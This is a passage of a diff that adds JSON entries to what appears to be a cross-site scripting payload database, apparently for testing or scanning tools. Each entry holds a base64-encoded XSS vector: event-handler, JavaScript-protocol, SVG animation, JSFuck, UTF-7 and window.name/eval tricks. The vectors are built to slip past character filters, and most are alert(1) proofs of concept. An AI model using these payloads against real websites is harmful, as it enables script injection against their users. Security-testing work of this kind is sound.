+		"script" : "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 160,
+		"summary" : "Restricted characters",
+		"description" : "XSS without greater using a HTML comment, , , ",
+		"script" : "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk8IS0t",
+		"type" : "XSS"
+	},
+	{
+		"id" : 161,
+		"summary" : "Restricted characters",
+		"description" : "Array based destructuring using onerror, , , ",
+		"script" : "PHNjcmlwdD50aHJvd1tvbmVycm9yXT1bYWxlcnRdLDE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 162,
+		"summary" : "Restricted characters",
+		"description" : "Destructuring using onerror, , , ",
+		"script" : "PHNjcmlwdD52YXJ7YTpvbmVycm9yfT17YTphbGVydH07dGhyb3cgMTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 163,
+		"summary" : "Restricted characters",
+		"description" : "Destructuring using default values and onerror, , , ",
+		"script" : "PHNjcmlwdD52YXJ7aGFoYTpvbmVycm9yPWFsZXJ0fT0wO3Rocm93IDE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 164,
+		"summary" : "Restricted characters",
+		"description" : "Vector using window.name, , , ",
+		"script" : "PHNjcmlwdD53aW5kb3cubmFtZT0namF2YXNjcmlwdDphbGVydCgxKSc7PC9zY3JpcHQ+PHN2ZyBvbmxvYWQ9bG9jYXRpb249bmFtZT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 165,
+		"summary" : "Restricted characters",
+		"description" : "Avoiding Invalid left-hand side in assignment without `, (), ?, [], or , using object literal, , , ",
+		"script" : "PHNjcmlwdD53aW5kb3cubmFtZT0namF2YXNjcmlwdDphbGVydCgxKSc7ZnVuY3Rpb24gYmxhaCgpe30gYmxhaCgiIit7YTpsb2NhdGlvbj1uYW1lfSsiIik8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 166,
+		"summary" : "Restricted characters",
+		"description" : "Avoiding Invalid left-hand side in assignment without `, (), ?, [], or , using new class, , , ",
+		"script" : "PHNjcmlwdD53aW5kb3cubmFtZT0namF2YXNjcmlwdDphbGVydCgxKSc7ZnVuY3Rpb24gYmxhaCgpe30gYmxhaCgiIituZXcgY2xhc3MgYnt0b1N0cmluZz1lPT5sb2NhdGlvbj1uYW1lfSsiIik8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 167,
+		"summary" : "Restricted characters",
+		"description" : "Script tag using only uppercase, , , ",
+		"script" : "PFNDUklQVCBTUkM9SFRUUFM6Ly9QT1JUU1dJR0dFUi1MQUJTLk5FVC9BLkpTPjwvU0NSSVBUPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 168,
+		"summary" : "Restricted characters",
+		"description" : "Script tag using only uppercase using JSFuck and inline, , , ",
+		"script" : "PFNDUklQVD5bXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXVsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyhbXVtbXV0rW10pWyshK1tdXSsoIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshK1tdXSsoW11bW11dK1tdKVsrW11dKyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKCEhW10rW10pWyshK1tdXV0oKCEhW10rW10pWyshK1tdXSsoISFbXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWytbXV0rKCEhW10rW10pWyshK1tdXSsoW11bW11dK1tdKVsrIStbXV0rKCtbIVtdXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWyshK1tdXV0rKCEhW10rW10pWyErW10rIStbXSshK1tdXSsoKyghK1tdKyErW10rIStbXStbKyErW11dKSlbKCEhW10rW10pWytbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoW10rW10pWyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKFtdW1tdXStbXSlbKyErW11dKyghW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbK1tdXSsoISFbXStbXSlbKyErW11dKyhbXVtbXV0rW10pWytbXV0rKFtdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0pWyshK1tdK1srW11dXSsoISFbXStbXSlbKyErW11dXVsoW11bW11dK1tdKVsrIStbXV0rKCFbXStbXSlbKyErW11dKygoK1tdKVsoW11bKCFbXStbXSlbK1tdXSsoIVtdK1tdKVshK1tdKyErW11dKyghW10rW10pWyshK1tdXSsoISFbXStbXSlbK1tdXV0rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXSlbKyErW10rWytbXV1dKyhbXVtbXV0rW10pWyshK1tdXSsoIVtdK1tdKVshK1tdKyErW10rIStbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshK1tdXSsoW11bW11dK1tdKVsrW11dKyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbIStbXSshK1tdKyErW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVsrIStbXStbK1tdXV0rKCEhW10rW10pWyshK1tdXV0rW10pWyshK1tdK1srIStbXV1dKyghIVtdK1tdKVshK1tdKyErW10rIStbXV1dXSghK1tdKyErW10rIStbXStbIStbXSshK1tdXSkrKCFbXStbXSlbKyErW11dKyghW10rW10pWyErW10rIStbXV0pKCkoKCFbXStbXSlbKyErW11dKyghW10rW10pWyErW10rIStbXV0rKCEhW10rW10pWyErW10rIStbXSshK1tdXSsoISFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dKyhbXVsoIVtdK1tdKVsrW11dKyghW10rW10pWyErW10rIStbXV0rKCFbXStbXSlbKyErW11dKyghIVtdK1tdKVsrW11dXStbXSlbKyErW10rWyErW10rIStbXSshK1tdXV0rWyshK1tdXSsoWytbXV0rIVtdK1tdWyghW10rW10pWytbXV0rKCFbXStbXSlbIStbXSshK1tdXSsoIVtdK1tdKVsrIStbXV0rKCEhW10rW10pWytbXV1dKVshK1tdKyErW10rWytbXV1dKTwvU0NSSVBUPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 169,
+		"summary" : "Frameworks",
+		"description" : "Bootstrap onanimationstart event, , , ",
+		"script" : "PHhzcyBjbGFzcz1wcm9ncmVzcy1iYXItYW5pbWF0ZWQgb25hbmltYXRpb25zdGFydD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 170,
+		"summary" : "Frameworks",
+		"description" : "Bootstrap ontransitionend event, , , ",
+		"script" : "PHhzcyBjbGFzcz0iY2Fyb3VzZWwgc2xpZGUiIGRhdGEtcmlkZT1jYXJvdXNlbCBkYXRhLWludGVydmFsPTEwMCBvbnRyYW5zaXRpb25lbmQ9YWxlcnQoMSk+PHhzcyBjbGFzcz1jYXJvdXNlbC1pbm5lcj48eHNzIGNsYXNzPSJjYXJvdXNlbC1pdGVtIGFjdGl2ZSI+PC94c3M+PHhzcyBjbGFzcz1jYXJvdXNlbC1pdGVtPjwveHNzPjwveHNzPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 171,
+		"summary" : "Protocols",
+		"description" : "Iframe src attribute JavaScript protocol, , , ",
+		"script" : "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 172,
+		"summary" : "Protocols",
+		"description" : "Object data attribute with JavaScript protocol, , , ",
+		"script" : "PG9iamVjdCBkYXRhPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 173,
+		"summary" : "Protocols",
+		"description" : "Embed src attribute with JavaScript protocol, , , ",
+		"script" : "PGVtYmVkIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 174,
+		"summary" : "Protocols",
+		"description" : "A standard JavaScript protocol, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI+WFNTPC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 175,
+		"summary" : "Protocols",
+		"description" : "The protocol is not case sensitive, , , ",
+		"script" : "PGEgaHJlZj0iSmFWYVNjcmlwdDphbGVydCgxKSI+WFNTPC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 176,
+		"summary" : "Protocols",
+		"description" : "Characters x01-x20 are allowed before the protocol, , , ",
+		"script" : "PGEgaHJlZj0iIGphdmFzY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 177,
+		"summary" : "Protocols",
+		"description" : "Characters x09,x0a,x0d are allowed inside the protocol, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXMgY3JpcHQ6YWxlcnQoMSkiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 178,
+		"summary" : "Protocols",
+		"description" : "Characters x09,x0a,x0d are allowed after protocol name before the colon, , , ",
+		"script" : "PGEgaHJlZj0iamF2YXNjcmlwdCA6YWxlcnQoMSkiPlhTUzwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 179,
+		"summary" : "Protocols",
+		"description" : "Xlink namespace inside SVG with JavaScript protocol, , , ",
+		"script" : "PHN2Zz48YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj48dGV4dCB4PSIyMCIgeT0iMjAiPlhTUzwvdGV4dD48L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 180,
+		"summary" : "Protocols",
+		"description" : "SVG animate tag using values, , , ",
+		"script" : "PHN2Zz48YW5pbWF0ZSB4bGluazpocmVmPSN4c3MgYXR0cmlidXRlTmFtZT1ocmVmIHZhbHVlcz1qYXZhc2NyaXB0OmFsZXJ0KDEpIC8+PGEgaWQ9eHNzPjx0ZXh0IHg9MjAgeT0yMD5YU1M8L3RleHQ+PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 181,
+		"summary" : "Protocols",
+		"description" : "SVG animate tag using to, , , ",
+		"script" : "PHN2Zz48YW5pbWF0ZSB4bGluazpocmVmPSN4c3MgYXR0cmlidXRlTmFtZT1ocmVmIGZyb209amF2YXNjcmlwdDphbGVydCgxKSB0bz0xIC8+PGEgaWQ9eHNzPjx0ZXh0IHg9MjAgeT0yMD5YU1M8L3RleHQ+PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 182,
+		"summary" : "Protocols",
+		"description" : "SVG set tag, , , ",
+		"script" : "PHN2Zz48c2V0IHhsaW5rOmhyZWY9I3hzcyBhdHRyaWJ1dGVOYW1lPWhyZWYgZnJvbT0/IHRvPWphdmFzY3JpcHQ6YWxlcnQoMSkgLz48YSBpZD14c3M+PHRleHQgeD0yMCB5PTIwPlhTUzwvdGV4dD48L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 183,
+		"summary" : "Protocols",
+		"description" : "Data protocol inside script src, , , ",
+		"script" : "PHNjcmlwdCBzcmM9ImRhdGE6dGV4dC9qYXZhc2NyaXB0LGFsZXJ0KDEpIj48L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 184,
+		"summary" : "Protocols",
+		"description" : "SVG script href attribute without closing script tag, , , ",
+		"script" : "PHN2Zz48c2NyaXB0IGhyZWY9ImRhdGE6dGV4dC9qYXZhc2NyaXB0LGFsZXJ0KDEpIiAvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 185,
+		"summary" : "Protocols",
+		"description" : "SVG use element Chrome/Firefox, , , ",
+		"script" : "PHN2Zz48dXNlIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbCw8c3ZnIGlkPSd4JyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPiN4Ij48L3VzZT48L3N2Zz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 186,
+		"summary" : "Protocols",
+		"description" : "Import statement with data URL, , , ",
+		"script" : "PHNjcmlwdD5pbXBvcnQoJ2RhdGE6dGV4dC9qYXZhc2NyaXB0LGFsZXJ0KDEpJyk8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 187,
+		"summary" : "Protocols",
+		"description" : "MathML makes any tag clickable, , , ",
+		"script" : "PG1hdGg+PHggaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI+YmxhaA==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 188,
+		"summary" : "Protocols",
+		"description" : "Button and formaction, , , ",
+		"script" : "PGZvcm0+PGJ1dHRvbiBmb3JtYWN0aW9uPWphdmFzY3JpcHQ6YWxlcnQoMSk+WFNT",
+		"type" : "XSS"
+	},
+	{
+		"id" : 189,
+		"summary" : "Protocols",
+		"description" : "Input and formaction, , , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9c3VibWl0IGZvcm1hY3Rpb249amF2YXNjcmlwdDphbGVydCgxKSB2YWx1ZT1YU1M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 190,
+		"summary" : "Protocols",
+		"description" : "Form and action, , , ",
+		"script" : "PGZvcm0gYWN0aW9uPWphdmFzY3JpcHQ6YWxlcnQoMSk+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPVhTUz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 191,
+		"summary" : "Protocols",
+		"description" : "Animate tag with keytimes and multiple values, , , ",
+		"script" : "PHN2Zz48YW5pbWF0ZSB4bGluazpocmVmPSN4c3MgYXR0cmlidXRlTmFtZT1ocmVmIGR1cj01cyByZXBlYXRDb3VudD1pbmRlZmluaXRlIGtleXRpbWVzPTA7MDsxIHZhbHVlcz0iaHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQ/JnNlbWk7amF2YXNjcmlwdDphbGVydCgxKSZzZW1pOzAiIC8+PGEgaWQ9eHNzPjx0ZXh0IHg9MjAgeT0yMD5YU1M8L3RleHQ+PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 192,
+		"summary" : "Protocols",
+		"description" : "Animate tag with auto executing use element, , , ",
+		"script" : "PHN2Zz48YW5pbWF0ZSB4bGluazpocmVmPSIjeCIgYXR0cmlidXRlTmFtZT0iaHJlZiIgdmFsdWVzPSJkYXRhOmltYWdlL3N2Zyt4bWwsJmx0O3N2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyZndDsmbHQ7aW1hZ2UgaHJlZj0nMScgb25lcnJvcj0nYWxlcnQoMSknIC8mZ3Q7Jmx0Oy9zdmcmZ3Q7I3giIC8+PHVzZSBpZD14IC8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 193,
+		"summary" : "Protocols",
+		"description" : "Embed supports code attribute, , , ",
+		"script" : "PGVtYmVkIGNvZGU9aHR0cHM6Ly9wb3J0c3dpZ2dlci1sYWJzLm5ldCB3aWR0aD01MDAgaGVpZ2h0PTUwMCB0eXBlPXRleHQvaHRtbD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 194,
+		"summary" : "Protocols",
+		"description" : "Object tag supports param url, , , ",
+		"script" : "PG9iamVjdCB3aWR0aD01MDAgaGVpZ2h0PTUwMCB0eXBlPXRleHQvaHRtbD48cGFyYW0gbmFtZT11cmwgdmFsdWU9aHR0cHM6Ly9wb3J0c3dpZ2dlci1sYWJzLm5ldD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 195,
+		"summary" : "Protocols",
+		"description" : "Object tag supports param code, , , ",
+		"script" : "PG9iamVjdCB3aWR0aD01MDAgaGVpZ2h0PTUwMCB0eXBlPXRleHQvaHRtbD48cGFyYW0gbmFtZT1jb2RlIHZhbHVlPWh0dHBzOi8vcG9ydHN3aWdnZXItbGFicy5uZXQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 196,
+		"summary" : "Protocols",
+		"description" : "Object tag supports param movie, , , ",
+		"script" : "PG9iamVjdCB3aWR0aD01MDAgaGVpZ2h0PTUwMCB0eXBlPXRleHQvaHRtbD48cGFyYW0gbmFtZT1tb3ZpZSB2YWx1ZT1odHRwczovL3BvcnRzd2lnZ2VyLWxhYnMubmV0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 197,
+		"summary" : "Protocols",
+		"description" : "Object tag supports param src, , , ",
+		"script" : "PG9iamVjdCB3aWR0aD01MDAgaGVpZ2h0PTUwMCB0eXBlPXRleHQvaHRtbD48cGFyYW0gbmFtZT1zcmMgdmFsdWU9aHR0cHM6Ly9wb3J0c3dpZ2dlci1sYWJzLm5ldD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 198,
+		"summary" : "Protocols",
+		"description" : "Navigation navigate method, , , ",
+		"script" : "PHNjcmlwdD5uYXZpZ2F0aW9uLm5hdmlnYXRlKCdqYXZhc2NyaXB0OmFsZXJ0KDEpJyk8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 199,
+		"summary" : "Other useful attributes",
+		"description" : "Using srcdoc attribute, , , ",
+		"script" : "PGlmcmFtZSBzcmNkb2M9IjxpbWcgc3JjPTEgb25lcnJvcj1hbGVydCgxKT4iPjwvaWZyYW1lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 200,
+		"summary" : "Other useful attributes",
+		"description" : "Using srcdoc with entities, , , ",
+		"script" : "PGlmcmFtZSBzcmNkb2M9IiZsdDtpbWcgc3JjPTEgb25lcnJvcj1hbGVydCgxKSZndDsiPjwvaWZyYW1lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 201,
+		"summary" : "Other useful attributes",
+		"description" : "Click a submit element from anywhere on the page, even outside the form, , , ",
+		"script" : "PGZvcm0gYWN0aW9uPSJqYXZhc2NyaXB0OmFsZXJ0KDEpIj48aW5wdXQgdHlwZT1zdWJtaXQgaWQ9eD48L2Zvcm0+PGxhYmVsIGZvcj14PlhTUzwvbGFiZWw+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 202,
+		"summary" : "Other useful attributes",
+		"description" : "Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements, , , ",
+		"script" : "PGlucHV0IHR5cGU9ImhpZGRlbiIgYWNjZXNza2V5PSJYIiBvbmNsaWNrPSJhbGVydCgxKSI+IChQcmVzcyBBTFQrU0hJRlQrWCBvbiBXaW5kb3dzKSAoQ1RSTCtBTFQrWCBvbiBPUyBYKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 203,
+		"summary" : "Other useful attributes",
+		"description" : "Link elements: Access key attributes can enable XSS on normally unexploitable elements, , , ",
+		"script" : "PGxpbmsgcmVsPSJjYW5vbmljYWwiIGFjY2Vzc2tleT0iWCIgb25jbGljaz0iYWxlcnQoMSkiIC8+IChQcmVzcyBBTFQrU0hJRlQrWCBvbiBXaW5kb3dzKSAoQ1RSTCtBTFQrWCBvbiBPUyBYKQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 204,
+		"summary" : "Other useful attributes",
+		"description" : "Download attribute can save a copy of the current webpage, , , ",
+		"script" : "PGEgaHJlZj0jIGRvd25sb2FkPSJmaWxlbmFtZS5odG1sIj5UZXN0PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 205,
+		"summary" : "Other useful attributes",
+		"description" : "Disable referrer using referrerpolicy, , , ",
+		"script" : "PGltZyByZWZlcnJlcnBvbGljeT0ibm8tcmVmZXJyZXIiIHNyYz0iLy9wb3J0c3dpZ2dlci1sYWJzLm5ldCI+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 206,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via parameter on the window.open function, , , ",
+		"script" : "PGEgaHJlZj0jIG9uY2xpY2s9IndpbmRvdy5vcGVuKCdodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocD9jb250ZXh0PWpzX3N0cmluZ19zaW5nbGUmeD0lMjc7ZXZhbChuYW1lKS8vJywnYWxlcnQoMSknKSI+WFNTPC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 207,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via name attribute in a <iframe> tag, , , ",
+		"script" : "PGlmcmFtZSBuYW1lPSJhbGVydCgxKSIgc3JjPSJodHRwczovL3BvcnRzd2lnZ2VyLWxhYnMubmV0L3hzcy94c3MucGhwP2NvbnRleHQ9anNfc3RyaW5nX3NpbmdsZSZ4PSUyNztldmFsKG5hbWUpLy8iPjwvaWZyYW1lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 208,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via target attribute in a <base> tag, , , ",
+		"script" : "PGJhc2UgdGFyZ2V0PSJhbGVydCgxKSI+PGEgaHJlZj0iaHR0cDovL3N1YmRvbWFpbjEucG9ydHN3aWdnZXItbGFicy5uZXQveHNzL3hzcy5waHA/Y29udGV4dD1qc19zdHJpbmdfc2luZ2xlJng9JTI3O2V2YWwobmFtZSkvLyI+WFNTIHZpYSB0YXJnZXQgaW4gYmFzZSB0YWc8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 209,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via target attribute in a <a> tag, , , ",
+		"script" : "PGEgdGFyZ2V0PSJhbGVydCgxKSIgaHJlZj0iaHR0cDovL3N1YmRvbWFpbjEucG9ydHN3aWdnZXItbGFicy5uZXQveHNzL3hzcy5waHA/Y29udGV4dD1qc19zdHJpbmdfc2luZ2xlJng9JTI3O2V2YWwobmFtZSkvLyI+WFNTIHZpYSB0YXJnZXQgaW4gYSB0YWc8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 210,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via usemap attribute in a <img> tag, , , ",
+		"script" : "PGltZyBzcmM9InZhbGlkaW1hZ2UucG5nIiB3aWR0aD0iMTAiIGhlaWdodD0iMTAiIHVzZW1hcD0iI3hzcyI+PG1hcCBuYW1lPSJ4c3MiPjxhcmVhIHNoYXBlPSJyZWN0IiBjb29yZHM9IjAsMCw4MiwxMjYiIHRhcmdldD0iYWxlcnQoMSkiIGhyZWY9Imh0dHA6Ly9zdWJkb21haW4xLnBvcnRzd2lnZ2VyLWxhYnMubmV0L3hzcy94c3MucGhwP2NvbnRleHQ9anNfc3RyaW5nX3NpbmdsZSZ4PSUyNztldmFsKG5hbWUpLy8iPjwvbWFwPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 211,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via target attribute in a <form> tag, , , ",
+		"script" : "PGZvcm0gYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgdGFyZ2V0PSJhbGVydCgxKSI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iWFNTIHZpYSB0YXJnZXQgaW4gYSBmb3JtIj48L2Zvcm0+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 212,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via formtarget attribute in a <input> tag type submit, , , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgdHlwZT0ic3VibWl0IiBmb3JtYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgZm9ybXRhcmdldD0iYWxlcnQoMSkiIHZhbHVlPSJYU1MgdmlhIGZvcm10YXJnZXQgaW4gaW5wdXQgdHlwZSBzdWJtaXQiPjwvZm9ybT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 213,
+		"summary" : "Other useful attributes",
+		"description" : "Set window.name via formtarget attribute in a <input> tag type image, , , ",
+		"script" : "PGZvcm0+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgbmFtZT0xIHR5cGU9ImltYWdlIiBzcmM9InZhbGlkaW1hZ2UucG5nIiBmb3JtYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgZm9ybXRhcmdldD0iYWxlcnQoMSkiIHZhbHVlPSJYU1MgdmlhIGZvcm10YXJnZXQgaW4gaW5wdXQgdHlwZSBpbWFnZSI+PC9mb3JtPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 214,
+		"summary" : "Special tags",
+		"description" : "Redirect to a different domain, , , ",
+		"script" : "PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDsgdXJsPS8vcG9ydHN3aWdnZXItbGFicy5uZXQiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 215,
+		"summary" : "Special tags",
+		"description" : "Meta charset attribute UTF-7, , , ",
+		"script" : "PG1ldGEgY2hhcnNldD0iVVRGLTciIC8+ICtBRHctc2NyaXB0K0FENC1hbGVydCgxKStBRHctL3NjcmlwdCtBRDQt",
+		"type" : "XSS"
+	},
+	{
+		"id" : 216,
+		"summary" : "Special tags",
+		"description" : "Meta charset UTF-7, , , ",
+		"script" : "PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTciIC8+ICtBRHctc2NyaXB0K0FENC1hbGVydCgxKStBRHctL3NjcmlwdCtBRDQt",
+		"type" : "XSS"
+	},
+	{
+		"id" : 217,
+		"summary" : "Special tags",
+		"description" : "UTF-7 BOM characters (Has to be at the start of the document) 1, , , ",
+		"script" : "Ky92OCArQUR3LXNjcmlwdCtBRDQtYWxlcnQoMSkrQUR3LS9zY3JpcHQrQUQ0LQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 218,
+		"summary" : "Special tags",
+		"description" : "UTF-7 BOM characters (Has to be at the start of the document) 2, , , ",
+		"script" : "Ky92OSArQUR3LXNjcmlwdCtBRDQtYWxlcnQoMSkrQUR3LS9zY3JpcHQrQUQ0LQ==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 219,
+		"summary" : "Special tags",
+		"description" : "UTF-7 BOM characters (Has to be at the start of the document) 3, , , ",
